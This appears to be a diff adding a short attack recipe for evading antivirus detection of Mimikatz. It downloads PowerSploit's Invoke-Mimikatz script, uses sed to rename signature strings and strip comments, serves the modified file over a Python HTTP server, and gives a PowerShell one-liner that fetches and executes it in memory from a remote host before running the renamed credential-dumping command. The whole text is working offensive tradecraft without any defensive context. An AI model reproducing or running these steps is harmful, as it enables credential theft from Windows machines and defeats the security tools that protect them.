@@ -1,0 +1,15 @@
+#AV Bypass for MimiKatz
+
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+sed -i -e 's/Invoke-Mimikatz/Invoke-KPKatz/g' Invoke-Mimikatz.ps1
+sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
+sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
+sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
+sed -i -e 's/ArgumentPtr/JustTodayPaul/g' Invoke-Mimikatz.ps1
+sed -i -e 's/CallDllMainSC1/ItIsNotTheKey/g' Invoke-Mimikatz.ps1
+sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
+python -m SimpleHTTPServer 3615
+
+# Client-side Remote Load: 
+Invoke-Expression (New-Object Net.Webclient).downloadstring('http://x.x.x.x:3615/Invoke-Mimikatz.ps1')
+Invoke-KPKatz
